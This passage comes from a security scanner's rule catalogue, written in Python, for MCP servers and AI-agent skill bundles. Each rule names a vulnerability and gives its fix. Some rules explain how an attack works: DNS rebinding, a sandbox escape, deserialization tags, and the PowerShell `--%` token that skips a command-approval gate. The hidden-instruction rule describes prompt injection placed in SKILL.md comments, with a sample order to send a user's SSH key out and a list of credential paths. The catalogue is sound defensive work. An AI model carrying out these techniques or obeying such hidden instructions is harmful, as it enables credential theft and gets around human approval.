    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-INJECT-04"],
    limitations=(
        "Reads `browse-mcp` in requirements*.txt at any depth and, at the project "
        "root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not "
        "read."
    ),
)

_r(
    "AAK-MCP-GENIEACS-CVE-2026-55637-001",
    "genieacs-mcp serves an unauthenticated /mcp listener open to DNS rebinding (< 0.3.2)",
    "genieacs-mcp before 0.3.2 starts an unauthenticated Streamable-HTTP `/mcp` "
    "listener (`cmd/server/main.go`) on the default `MCP_LISTEN_ADDR` of "
    "`127.0.0.1:8080` whenever `MCP_AUTH_TOKEN` is unset, and the "
    "`httpSrv.Start(addr)` path validates neither `Host` nor `Origin` "
    "(CVE-2026-55637). Binding to loopback is not the boundary it looks like: a "
    "malicious website resolves its own name to 127.0.0.1 and the browser sends "
    "same-origin-looking requests to the local server, so DNS rebinding reaches "
    "the tool surface of a TR-069 ACS bridge. Fixed in 0.3.2.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `genieacs-mcp` to >= 0.3.2 and pin it, and set `MCP_AUTH_TOKEN` "
    "regardless. Loopback binding does not authenticate a browser: validate "
    "`Origin` and `Host` against an allow-list on any local HTTP MCP listener.",
    sarif_name="GenieacsMcpDnsRebind",
    cve_references=["CVE-2026-55637"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `genieacs-mcp` in requirements*.txt at any depth and, at the project "
        "root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not "
        "read."
    ),
)

_r(
    "AAK-MCP-SUBLINEAR-CVE-2026-55609-001",
    "consciousness-explorer state tools accept a caller-controlled path "
    "(sublinear-time-solver < 1.6.0, consciousness-explorer < 1.1.2)",
    "The `export_state` and `import_state` tools in "
    "`src/consciousness-explorer/mcp/server.js` pass the caller-controlled "
    "`filepath` parameter to filesystem operations without restricting the "
    "destination (CVE-2026-55609), so an MCP client reads or writes outside the "
    "intended directory. One advisory, two npm packages, and they carry different "
    "floors: `sublinear-time-solver` fixes it in 1.6.0 and "
    "`consciousness-explorer` in 1.1.2, so both are pinned under this rule and "
    "whichever a project depends on fires below its own floor.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `sublinear-time-solver` to >= 1.6.0 and/or `consciousness-explorer` "
    "to >= 1.1.2 and pin them. For a state-persistence tool, do not take a path "
    "from the caller at all: derive it from a server-side root plus a validated "
    "identifier, and resolve-and-contain before opening.",
    sarif_name="ConsciousnessExplorerStatePathTraversal",
    cve_references=["CVE-2026-55609"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-INJECT-04"],
    limitations=(
        "Reads `sublinear-time-solver` and `consciousness-explorer`, each against "
        "its own fix floor, in requirements*.txt at any depth and, at the project "
        "root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not "
        "read."
    ),
)


# ---------------------------------------------------------------------------
# OWASP Agentic Skills Top 10 (AST10) — the statically decidable subset.
# Three rules, not ten. AST01, AST03 and the semantic half of AST04 were already
# covered by AAK-SKILL-*, AAK-POISON-* and AAK-COMPOSE-003, and the remaining
# categories need runtime evidence. See scanners/agentic_skills.py.
# ---------------------------------------------------------------------------

_r(
    "AAK-AST02-001",
    "Skill bundle pulls an external resource that nothing pins",
    "A skill bundle references an external resource with no content hash, commit "
    "SHA, integrity field or exact version anywhere in it: a git ref that moves "
    "(`main`, `master`, `HEAD`), a `releases/latest` redirect, a pipe-to-shell "
    "installer, or an unpinned package install. What the skill runs is then "
    "whatever that source serves at the moment it is used, and the skill itself "
    "never has to change for its behaviour to. This is OWASP AST02 Supply Chain "
    "Compromise together with the pinning half of AST07 Update Drift, whose own "
    "mitigation is stated as pinning to immutable content hashes rather than "
    "version ranges. The scale is why it is a rule rather than a lint: Air "
    "Security's *Circus of Skills* (2026-06-24) found 17,822 of 142,836 live "
    "skills, about 12.4% and 6.7M installs, resting on at least one untrusted "
    "external resource, and *SkillJacking* (2026-07-02) found 925 of them on "
    "sources that could be taken over outright — a deleted GitHub account "
    "re-registered, an expired domain — with no update event and no scanner alert.",
    Severity.HIGH,
    Category.AGENTIC_SKILL,
    "Pin every external resource the bundle reaches to something immutable: a "
    "commit SHA rather than a branch, a release asset with a recorded `sha256:` "
    "rather than `releases/latest`, an exact package version rather than a range. "
    "If the resource is a script fetched at run time, vendor it into the bundle so "
    "review and pinning apply to it. Pinning is what makes a later change "
    "reviewable; without it an upstream takeover reaches you on next use rather "
    "than on next upgrade.",
    sarif_name="AgenticSkillUnpinnedExternalResource",
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-01"],
    owasp_ast_references=["AST02", "AST07"],
    limitations=(
        "Static, and scoped to what a skill bundle declares on disk. It cannot see a resource that is pinned at install time by tooling outside the bundle, and it does not fetch anything, so a pinned reference that now resolves elsewhere looks the same as one that does not. "
        "It reports a bundle only when *nothing* in it is pinned, so a bundle that "
        "pins its dependencies and floats one script is not reported — that keeps "
        "the rule quiet on ordinary projects at the cost of missing partial "
        "pinning. It reads the shapes listed above and will miss an unpinned "
        "resource fetched through an indirection it cannot follow."
    ),
)

_r(
    "AAK-AST04-001",
    "Skill frontmatter carries a deserialization tag that executes on parse",
    "A skill's YAML frontmatter contains a language-specific deserialization tag — "
    "`!!python/object/apply`, `!ruby/object`, `!!java/...` and the like. A loader "
    "using its language's unsafe default constructs the named object *while "
    "parsing*, so the payload runs before any field of the skill is read and "
    "before the skill is ever invoked: installing or merely listing the skill is "
    "enough. This is the parsing layer of OWASP AST04 Insecure Metadata, which "
    "names the case directly. Distinct from `AAK-SKILL-005`, which reads "
    "frontmatter *values* for prompt-injection triggers: that rule assumes parsing "
    "already happened safely, and this one is about parsing being the "
    "vulnerability.",
    Severity.CRITICAL,
    Category.AGENTIC_SKILL,
    "Remove the tag. There is no legitimate reason for skill metadata to construct "
    "a language object, so treat its presence as intent rather than as a mistake, "
    "and review what else the bundle ships. Load skill frontmatter with a safe "
    "loader — `yaml.safe_load` in Python, `safe_load` equivalents elsewhere — so a "
    "tag like this raises rather than executes; if you maintain a loader, that "
    "change protects every skill it will ever read.",
    sarif_name="AgenticSkillFrontmatterDeserializationTag",
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-INJECT-01"],
    owasp_ast_references=["AST04"],
    limitations=(
        "Static, and scoped to what a skill bundle declares on disk. It cannot see a resource that is pinned at install time by tooling outside the bundle, and it does not fetch anything, so a pinned reference that now resolves elsewhere looks the same as one that does not. "
        "It matches the tag syntax of the common unsafe loaders and will miss a "
        "loader with a bespoke tag vocabulary. It reports the tag's presence, not "
        "whether the loader in use is configured unsafely — a bundle parsed only "
        "by a safe loader carries the tag harmlessly, which is still worth "
        "removing because the next loader may not be."
    ),
)

_r(
    "AAK-AST10-001",
    "Skill ships platform manifests whose security metadata disagrees",
    "A skill bundle carries more than one platform manifest — `SKILL.md` "
    "frontmatter, `skill.json`, `manifest.json`, `package.json` — and a "
    "security-relevant field declared in one is absent from another, or declares "
    "something weaker in one than the other: a risk tier that exists on one "
    "platform and not the next, a permission list replaced by a blanket `true`, a "
    "signature field that survives in one format only. Whichever platform loads "
    "the weaker manifest runs the skill without the control the other declares. "
    "This is OWASP AST10 Cross-Platform Reuse, whose first attack scenario is a "
    "`risk_tier: L3` skill ported to a platform that does not support `risk_tier` "
    "so the warning is silently dropped. Like the composition rules, this is a "
    "question no single artifact can answer: each manifest is internally "
    "consistent, and the defect exists only in the disagreement between them.",
    Severity.MEDIUM,
    Category.AGENTIC_SKILL,
    "Normalise the security fields across every manifest the bundle ships, which "
    "is AST10's own mitigation: `risk_tier`, permissions, egress and signature "
    "should say the same thing in each format or the bundle should ship one "
    "format. Where a platform has no equivalent for a field, do not drop it "
    "silently — record the gap in the bundle so a reviewer sees that the control "
    "is unenforced there rather than absent by design. Re-validate the metadata "
    "whenever a skill is ported; equivalence between formats is the assumption "
    "this risk is named after.",
    sarif_name="AgenticSkillCrossPlatformMetadataLoss",
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-01"],
    owasp_ast_references=["AST10"],
    limitations=(
        "Static, and scoped to what a skill bundle declares on disk. It cannot see a resource that is pinned at install time by tooling outside the bundle, and it does not fetch anything, so a pinned reference that now resolves elsewhere looks the same as one that does not. "
        "It compares only fields whose loss is unambiguous, and only in the "
        "unambiguous direction: an allow-list replaced by a blanket `true`, or a "
        "declaration replaced by nothing. Two differing permission lists are left "
        "alone, because deciding which is weaker needs a judgement this rule "
        "cannot make without guessing. A bundle shipping one manifest is out of "
        "scope by construction, and so is a manifest that does not parse — which "
        "matters here, because frontmatter carrying a deserialization tag is "
        "rejected by safe parsing and therefore drops out of this comparison "
        "entirely. In that case `AAK-AST04-001` is the finding that applies."
    ),
)


# ---------------------------------------------------------------------------
# Composition — rules that hold over a graph of components rather than one
# artifact. See scanners/composition.py for why these are distinct from
# AAK-AGENT-COMPOSE-001, which is an unordered capability union over one
# container of skills.
# ---------------------------------------------------------------------------

_r(
    "AAK-COMPOSE-001",
    "Untrusted input reaches network egress through a 2- or 3-component chain "
    "that no single component would trip",
    "An ordered path of two or three components carries untrusted input to "
    "network egress, passing through one that reads secrets or local state, while "
    "no single component on the path holds all three roles. Each component "
    "therefore passes every rule that inspects it alone, and the exposure exists "
    "only because they were composed. This is the CompoSkill result "
    "(arXiv:2608.16246): a risk chain assembled from parts that each clear an "
    "individual scanner. Paths are capped at three components, which is where that "
    "paper\'s own attack-success numbers concentrate before longer chains degrade "
    "them, and beyond which the search cost grows as the node count to the power "
    "of the depth. Components are skills (`SKILL.md`) and MCP servers, and an edge "
    "exists where one component\'s declared output is another\'s declared input, "
    "or where both are registered together and the second accepts free-form text. "
    "Distinct from `AAK-AGENT-COMPOSE-001`, which asks whether an unordered set of "
    "skills spans a boundary: this asks whether a directed path carries data "
    "across one.",
    Severity.HIGH,
    Category.COMPOSITION,
    "Break one link rather than hardening every component. In order of "
    "effectiveness: stop the first component\'s untrusted output from reaching the "
    "next automatically (require a human step, or a schema that cannot carry "
    "instructions); drop the egress component\'s reach to an allow-list of "
    "destinations; or split the chain across contexts so the components are never "
    "loaded together. Hardening the middle component alone does not help, because "
    "the chain re-forms around any replacement with the same capability.",
    sarif_name="CompositionChainToEgress",
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-INJECT-01"],
    incident_references=["ARXIV-2608.16246", "ARXIV-2608.09732"],
    limitations=(
        "This is a static pass over declared configuration. It cannot resolve tool registration that happens at runtime, so a component added from a registry fetched at start-up is invisible to it, and a chain assembled at runtime from such components will not appear here. "
        "Capability comes from what a component declares, so an under-declared "
        "component makes its chains look narrower than they are - that gap is what "
        "AAK-COMPOSE-003 reports. Where components declare no explicit input/output "
        "wiring, edges come from co-registration, which over-approximates who can "
        "hand data to whom. It reasons about capability reachability, not proof of "
        "a data flow: it does not execute anything or evaluate a condition, so a "
        "reported chain is a path that exists, not one that is guaranteed to be "
        "taken. It stands down entirely when any component on the path is already "
        "reported at or above its own severity, so a genuine chain can be hidden by "
        "an unrelated finding of equal weight on one of its components. Above 200 "
        "components in a scanned project the graph is not built at all and this rule "
        "reports nothing, which is silence rather than a clean result."
    ),
)

_r(
    "AAK-COMPOSE-002",
    "Two or more skills share an undeclared writable path",
    "Two or more skills that load into the same context both reference the same "
    "writable filesystem path, and none of them declares a write capability or "
    "names that path as an output. An undeclared path both can reach is a channel "
    "between them: one writes what the other reads, with no interface either "
    "manifest describes and nothing in a per-skill review to notice. This is the "
    "ColluSkill shape (arXiv:2608.09732), where the cooperation is what carries "
    "the attack rather than any single skill\'s behaviour. A declared-capability "
    "union cannot see this by construction, because the relevant capability is "
    "precisely the one nobody declared.",
    Severity.HIGH,
    Category.COMPOSITION,
    "Decide whether the shared path is an interface or an accident. If the skills "
    "are meant to exchange data, declare it: name the path as an output of the "
    "writer and an input of the reader, so a reviewer and this scanner both see "
    "the coupling. If they are not, give each skill its own working directory. Do "
    "not resolve it by adding a write capability to one manifest and leaving the "
    "path shared - that documents the write without documenting the channel.",
    sarif_name="CompositionSharedUndeclaredState",
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-INJECT-01"],
    incident_references=["ARXIV-2608.09732"],
    limitations=(
        "This is a static pass over declared configuration. It cannot resolve tool registration that happens at runtime, so a component added from a registry fetched at start-up is invisible to it, and a chain assembled at runtime from such components will not appear here. "
        "Paths are read literally out of skill bodies and adjacent scripts, so a "
        "path built at runtime from a variable or an environment lookup is not "
        "seen, and two skills sharing a channel under different spellings of the "
        "same location will not be matched. It reports co-reference, not a proven "
        "write followed by a read."
    ),
)

_r(
    "AAK-COMPOSE-003",
    "A skill declares a narrower capability than its code exercises",
    "A skill\'s manifest declares one set of capabilities while its body or an "
    "adjacent script exercises a wider one - a network call, a shell block, a file "
    "write or a credential read the frontmatter does not admit to. This matters "
    "beyond the single skill: every composition rule builds its graph from "
    "manifests, so an under-declared component makes each chain through it look "
    "narrower than it is, and a chain that would otherwise be reported can be "
    "missed. It is reported as its own finding rather than folded into the chain "
    "rules because the fix is different - the manifest is wrong, whether or not "
    "any chain currently runs through it.",
    Severity.MEDIUM,
    Category.COMPOSITION,
    "Reconcile the manifest with the code. Either declare the capability the code "
    "actually uses, so reviewers and capability-based tooling see the real surface, "
    "or remove the code path if the narrower declaration was the intent. Prefer "
    "narrowing the code: a manifest widened to match an incidental `curl` grants "
    "that capability permanently.",
    sarif_name="CompositionUnderdeclaredCapability",
    owasp_agentic_references=["ASI04"],
    owasp_ast_references=["AST03"],
    adversa_references=["ADV-SUPPLY-01"],
    incident_references=["ARXIV-2608.16246"],
    limitations=(
        "This is a static pass over declared configuration. It cannot resolve tool registration that happens at runtime, so a component added from a registry fetched at start-up is invisible to it, and a chain assembled at runtime from such components will not appear here. "
        "Body capability is detected by pattern, not by parsing, so it sees a "
        "literal `curl` or `subprocess` call and not one reached through an "
        "indirection or an imported helper. It reads only files inside the skill "
        "directory. A skill that documents a capability in prose without using it "
        "can be reported where the prose contains a matching literal."
    ),
)


_r(
    "AAK-MCP-LANGGRAPH-API-CVE-2026-55235-001",
    "langgraph-api < 0.10.0 (loopback webhook bypasses per-user authorization)",
    "`langgraph-api` before 0.10.0 lets a run or cron name a *relative* webhook "
    "target, delivered over an in-process loopback transport that the "
    "authentication middleware treats as internal: the external auth context "
    "is never applied. In a deployment that separates threads and runs by "
    "per-user authorization, an authenticated user can aim a webhook at the "
    "server's own thread and run routes and create a run on, or modify, "
    "another user's thread, pulling some of the targeted thread's metadata "
    "into the created run record (CVE-2026-55235, MEDIUM CVSS 5.9). Fixed in "
    "0.10.0. The fix does not make loopback delivery safe in general: a "
    "deployment that deliberately re-enables it still carries unauthenticated "
    "webhooks and must restrict them to controlled same-process routes.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `langgraph-api` to 0.10.0 or later. If loopback webhook delivery "
    "is re-enabled deliberately, restrict the targets to a controlled "
    "same-process allowlist and do not treat a transport being in-process as "
    "an authorization decision.",
    sarif_name="McpLangGraphApiWebhookAuthBypass",
    cve_references=["CVE-2026-55235"],
    owasp_agentic_references=["ASI03", "ASI04"],
    limitations=(
        "Reads `langgraph-api` in requirements*.txt at any depth and, at the project "
        "root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`) or in a lockfile format the reader "
        "does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, "
        "is not read."
    ),
)

_r(
    "AAK-MCP-STDIO-CMD-INJ-005",
    "MCP STDIO command spawned from network-controlled input (Go)",
    "A Go file calls `exec.Command(...)` or `exec.CommandContext(...)` in an "
    "MCP-shaped file, after a network-controlled source in the same scope: "
    "`json.NewDecoder(r.Body)`, an `*http.Request` handler parameter, or "
    "`c.ShouldBindJSON(...)`. CVE-2026-90898 (maximhq/bifrost, CVSS 9.8) is "
    "the anchor: Bifrost registers MCP clients through a management API, a "
    "stdio client is a command plus args, and the gateway starts that program "
    "the moment the client is added, so one unauthenticated "
    "`POST /api/mcp/client` runs a program as the gateway user. Fixed in "
    "`transports/v2.1.0`. NOTE: this rule is regex and proximity, exactly like "
    "the Rust arm `AAK-MCP-STDIO-CMD-INJ-004`, and not Go data-flow analysis. "
    "It reports that a spawn sink appears in an MCP file downstream of a "
    "network-shaped source, which is not the same claim as proving the "
    "request reaches the sink. Expect false positives where a handler decodes "
    "a body and separately shells out to a constant. There is no go/ast pass "
    "behind this and none is pending.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Do not build an exec argv from request-controlled values. Resolve the "
    "command against a fixed allowlist server-side, pass caller data as data "
    "rather than as argv, and require authentication on any route that "
    "registers or starts a subprocess: an unauthenticated registration "
    "endpoint that spawns is remote code execution by design, not by bug.",
    sarif_name="McpStdioCommandTaintedGo",
    cve_references=["CVE-2026-90898"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    limitations=(
        "Matches an `exec.Command` or `exec.CommandContext` call in an MCP-shaped "
        "Go file with a request-decoding marker (`json.NewDecoder(r.Body)`, an "
        "`*http.Request` handler, `ShouldBindJSON`, `mux.Vars`) in the preceding 2 "
        "KB, unless its first argument is a string literal. A literal program with "
        "the request in the arguments, such as `exec.Command(\"sh\", \"-c\", "
        "req.Command)`, is therefore not reported."
    ),
)

_r(
    "AAK-SKILL-006",
    "SKILL.md body hides an instruction in an HTML comment",
    "A `SKILL.md` body carries an HTML comment whose text reads as an "
    "instruction rather than a note: an injection trigger, or a local-secret "
    "reference paired with an outbound destination. The comment is invisible "
    "in every rendered view a human reviews -- GitHub, an editor preview, a "
    "skill marketplace listing -- and fully visible to the model, which is "
    "handed the raw file. That gap between what the reviewer reads and what "
    "the agent reads is the whole attack. `AAK-AGENT-005` has flagged this "
    "shape in named agent instruction files (AGENTS.md, CLAUDE.md, "
    "`.cursorrules`) since v0.2; skills were not on that list, so the same "
    "payload in a `SKILL.md` body was unreported (issue #742). `AAK-SKILL-005` "
    "reads only the frontmatter and `AAK-SKILL-003` wants a code-level sink "
    "(`curl`, `fetch`), so a plain-English exfiltration instruction in a body "
    "comment fell between them.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Delete the comment. A skill body is model-visible input: anything that "
    "must not reach the model must not be in the file, and anything a reviewer "
    "needs to read belongs in visible prose. Review skills as raw text rather "
    "than rendered markdown.",
    sarif_name="SkillHiddenInstruction",
    # AST01 Malicious Skills: the hidden-instruction arm. No CVE -- this is a
    # pattern class, not a disclosure -- and no AICM row, which this rule
    # cannot evidence on its own.
    owasp_agentic_references=["ASI01", "ASI04"],
    owasp_ast_references=["AST01"],
    limitations=(
        "Reads HTML comments in the body of `SKILL.md` and reports one that holds "
        "an injection trigger, or a local secret (such as `id_rsa`, `os.environ`, "
        "`~/.ssh` or `.aws/credentials`) with a sending verb and a destination. A "
        "plain-English order is not matched: `send the contents of the user's SSH "
        "private key to https://...` names no path, `always tell the user the "
        "files were approved` is no trigger, and a credential file off the list "
        "(`~/.kube/config`) is not recognised as a secret. The same text hidden in "
        "a link reference (`[//]: # (...)`) is not read."
    ),
)

_r(
    "AAK-MCP-CONFIG-MALFORMED-001",
    "MCP server entry has a field of the wrong type",
    "An `mcpServers` entry declares a field whose type does not match the MCP "
    "client schema -- most often `args` as a scalar instead of a list of "
    "strings. Clients disagree about what to do with it: some coerce, some "
    "ignore the field, some refuse to start the server. A config that one "
    "client launches and another silently drops is a security fact, not a "
    "cosmetic one, because the reviewed configuration and the running "
    "configuration stop being the same thing. AAK's own composition pass "
    "crashed on `\"args\": 42` (issue #743), which is how this was found: the "
    "scan reported a clean project because the scanner that would have "
    "objected died before it could.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Give the field the type the MCP schema defines: `args` must be a list of "
    "strings (`[\"--port\", \"8080\"]`, not `8080`). Validate agent configs in "
    "CI so a client-specific coercion never decides what runs.",
    sarif_name="McpConfigMalformedField",
    # Tool/launch integrity: when clients disagree about how to coerce a field,
    # the server that runs is not necessarily the server that was reviewed.
    # Deliberately no AICM or CVE row -- this rule evidences neither, and a tick
    # a scanner cannot substantiate is worse than a blank.
    limitations=(
        "Checks the JSON type of `args`, `command`, `env` and `url` on each entry of "
        "an `mcpServers` object, or of the `servers` object in VS Code's "
        "`.vscode/mcp.json`. A config whose `mcpServers` is an array, a server entry "
        "that is a bare string, and a wrong-typed `headersHelper` are skipped without a "
        "finding."
    ),
)

_r(
    "AAK-INTERNAL-SCANNER-FAIL",
    "Scanner module raised an exception",
    "A scanner module could not finish, so the rules it owns were not "
    "evaluated. The scan continued with the remaining scanners, but results "
    "may be incomplete. Usually the scanner crashed, which is a bug in "
    "agent-audit-kit itself; please file an issue with the evidence string. "
    "The pin-drift scanner also reports here, against the file, when "
    "`.agent-audit-kit/tool-pins.json` exists but cannot be read: a rug-pull "
    "check with no readable baseline has checked nothing, and the evidence "
    "says why the file could not be used.",
    Severity.INFO,
    Category.AGENT_CONFIG,
    "If the evidence names an input file, repair it. For the tool-pin file, "
    "restore it from version control, or review the current tool definitions "
    "and re-pin with `agent-audit-kit pin`; re-pinning accepts whatever the "
    "config declares now, so review first. Otherwise file an issue at "
    "https://github.com/sattyamjjain/agent-audit-kit/issues with the scanner "
    "name, exception class, and (if safe) the project shape.",
    sarif_name="InternalScannerFail",
)


# ---------------------------------------------------------------------------
# The credential that points the wrong way (2026-08 wave)
#
# An MCP HTTP transport that binds every interface while its only credential is
# spent on *upstream* calls. Every reader sees a token and concludes the server
# is authenticated; no caller is ever challenged. CVE-2026-82456 (argocd-mcp
# 0.8.0, CVSS 10.0) is the anchor, not the identity — the rule is keyed on the
# conjunction, so the next package of this shape needs no pin. See
# scanners/mcp_transport_session_unauth.py for why the generic no-auth rule
# cannot see this shape, and for the two detections that can.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-TRANSPORT-SESSION-UNAUTH-001",
    "MCP HTTP transport binds every interface and authenticates no caller",
    "An MCP server exposes an HTTP/SSE transport on every network interface and "
    "creates sessions without requiring a caller credential. A credential is "
    "present \u2014 read from the environment and attached to the server's own "
    "upstream requests \u2014 but it authenticates the server to its backend, not "
    "the caller to the server, so any host that can reach the listener invokes "
    "the full tool surface with the operator's stored token. The bind is often "
    "implicit: in Node, `.listen(port)` with the host argument omitted binds "
    "every interface with no 0.0.0.0 literal anywhere in the source.",
    Severity.CRITICAL,
    Category.TRANSPORT_SECURITY,
    "Require a separate inbound credential for network transports, and treat "
    "environment tokens as outbound-only \u2014 never as proof of a caller's "
    "identity. Bind 127.0.0.1 by default, and set "
    "`enableDnsRebindingProtection: true` with `allowedHosts` / `allowedOrigins` "
    "on each transport (or use the SDK's `hostHeaderValidation()` middleware).",
    sarif_name="McpTransportSessionUnauth",
    cve_references=["CVE-2026-82456"],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
    incident_references=["GHSA-rp45-5x3v-48mr"],
    limitations=(
        "Reads one file at a time, so an inbound check applied from a separate "
        "middleware module is not seen. The implicit all-interfaces bind is "
        "inferred for JS/TS only, where Node's listen() defaults to every "
        "interface; Python servers default to loopback and are never inferred."
    ),
)


# ---------------------------------------------------------------------------
# Three guards that were present and wrong (2026-09-02 wave)
#
# Each of these has a near neighbour in the corpus that does not cover it, and in
# every case the difference is the same shape: the defence exists, so a detector
# keyed on "the defence is missing" stays quiet. Checked by scanning each
# disclosed shape against the whole engine before writing a rule -- nothing fired
# for any of the three. See the scanner docstrings for which neighbour was
# considered and why it falls short.
# ---------------------------------------------------------------------------

_r(
    "AAK-SSRF-BRACKETED-HOST-001",
    "SSRF guard classifies an IPv6 hostname it never unbracketed",
    "A URL allow-list reads `.hostname` from a parsed URL and passes it to an "
    "IP-classification call, without removing the brackets WHATWG keeps around an "
    "IPv6 literal. `net.isIP(\"[::1]\")` returns 0, so the branch holding the "
    "private-address checks never runs and the guard falls through to its "
    "default-allow tail. A caller asking for `http://[::1]/` reaches loopback "
    "through a check written to stop exactly that. The guard being present is why "
    "the missing-allow-list rules stay silent on it.",
    Severity.HIGH,
    Category.TRANSPORT_SECURITY,
    "Strip the surrounding brackets before classifying the host, and make the "
    "guard default to deny rather than allow when classification fails.",
    sarif_name="SsrfBracketedHostBypass",
    cve_references=["CVE-2026-80347"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SSRF-01"],
    aicm_references=["IVS-04", "AIS-08"],
    limitations=(
        "JS/TS only. Python's urlsplit().hostname already strips the brackets, so "
        "the same code shape is not vulnerable there and is deliberately not "
        "flagged. Reads one file at a time, so a guard whose bracket handling "
        "lives in an imported helper is not seen."
    ),
)

_r(
    "AAK-MCP-TOOLS-LIST-UNBOUNDED-001",
    "MCP tool catalogue built from an upstream response with no cap",
    "An MCP client or aggregator assembles its tool catalogue from what upstream "
    "servers return, with no bound on the number of tools or the size of a schema. "
    "The size of the allocation is then chosen by whoever controls the upstream, "
    "not by this process. Distinct from an unbounded *request body*: that value "
    "arrives from the caller, this one arrives from the server being aggregated, "
    "and a body-size limit does not touch it.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Cap the number of tools accepted from any single upstream and reject "
    "oversized descriptions and schemas before building the catalogue.",
    sarif_name="McpToolsListUnbounded",
    cve_references=["CVE-2026-84289"],
    owasp_agentic_references=["ASI08"],
    adversa_references=["ADV-DOS-01"],
    limitations=(
        "Detects the absence of any bound in the same file as the catalogue "
        "builder. A cap enforced in a wrapper or by the transport layer is not "
        "seen, and a slice, a length check, a max_* constant or a break in the "
        "loop all clear the finding."
    ),
)

_r(
    "AAK-APPROVAL-PARSER-DESYNC-001",
    "Command-safety parser and the executing shell disagree about a token",
    "An agent decides whether a command needs human approval by parsing it, then "
    "hands it to a PowerShell-family interpreter, without handling the "
    "stop-parsing token `--%`. pwsh re-reads everything after `--%` verbatim, so "
    "the command that was classified is not the command that runs and the "
    "approval prompt is skipped. Neither truncation nor a rebuilt argv is "
    "involved: the checker and the shell read the same bytes and disagree about "
    "what they mean, which is a third route to the same bypass.",
    Severity.HIGH,
    Category.TRUST_BOUNDARY,
    "Reject `--%` (and any token that suspends the interpreter's own parsing) "
    "before classifying a command, or pass an argv straight to the interpreter "
    "instead of a shell-parsed command string.",
    sarif_name="ApprovalParserDesync",
    cve_references=["CVE-2026-19591"],
    owasp_agentic_references=["ASI05", "ASI09"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Covers the PowerShell stop-parsing token specifically, not every shell's "
        "escaping grammar. A gate in front of bash or cmd is not flagged, because "
        "claiming to know every shell's parser is a claim a pattern scan cannot "
        "make. Any mention of `--%` or stop-parsing in the file clears it."
    ),
)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


_r(
    "AAK-MCP-TOOLUNIVERSE-CVE-2026-81096-001",
    "ToolUniverse unauthenticated RCE via python_code_executor sandbox escape (<= 1.2.6)",
    "ToolUniverse (`tooluniverse`, PyPI) through 1.2.6 runs caller-supplied Python "
    "inside a sandbox that can be escaped, on a server that requires no "
    "authentication (CVE-2026-81096, CVSS 10.0). The executor behind the "
    "`python_code_executor` tool inspects submitted source against a deny-list of "
    "attribute names and calls but leaves the attribute-lookup builtins available, "
    "so a dunder attribute reached through a string lookup — or through a module "
    "already permitted — lets a caller walk from a literal's class to its base and "
    "enumerate subclasses until it holds a reference to `subprocess`. A per-call "
    "argument also widens the import allow-list before the inspection runs. The HTTP "
    "and MCP servers (`http_api_server.py`, `smcp_server.py`) bind every interface "
    "with debugging enabled and no authentication, so any caller that reaches the "
    "port executes code as the server process. 1.3.0 adds bearer-token "
    "authentication, defaults the bind address to loopback, and hardens the "
    "attribute checks. Treat < 1.3.0 (and unpinned) as exposed.",
